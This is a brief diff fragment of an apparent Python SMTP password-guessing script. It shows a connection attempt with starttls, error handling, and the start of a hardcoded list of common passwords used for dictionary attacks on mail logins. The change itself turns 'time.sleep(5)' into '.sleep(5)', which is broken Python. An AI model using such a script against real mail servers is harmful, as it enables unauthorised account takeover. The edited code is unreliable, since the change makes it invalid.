@@ -6,7 +6,7 @@ try:
     server.starttls()
 except:
     print('[!] Error Connecting to SMTP Server')
-    time.sleep(5)
+    .sleep(5)
     sys.exit()
  
 passwords = ['password', 'admin', 'adminsitator', 'passwords', 'godlover', 'adminstatorlogin',
